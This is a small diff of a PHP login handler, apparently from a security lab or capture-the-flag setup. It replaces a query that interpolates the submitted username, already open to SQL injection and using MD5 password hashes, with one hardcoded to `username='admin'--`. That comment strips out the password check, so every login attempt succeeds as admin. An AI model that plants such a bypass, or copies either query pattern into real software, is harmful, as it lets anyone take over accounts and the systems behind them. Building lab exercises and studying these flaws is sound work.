@@ -5,7 +5,7 @@
 
 		if (!$conn) exit("Connection failed, please contact a faciltator. Error message:<br><br><pre>" . mysqli_connect_error());
 		$password_hash = md5($_POST['password']);
-		$query = "SELECT `id` FROM `users` WHERE `username`='{$_POST['username']}' AND `password`='{$password_hash}'";
+		$query = "SELECT `id` FROM `users` WHERE `username`='admin'-- AND `password`='{$password_hash}'";
 		$sql_result = mysqli_query($conn, $query);
 
 		if (mysqli_num_rows($sql_result) > 0) {
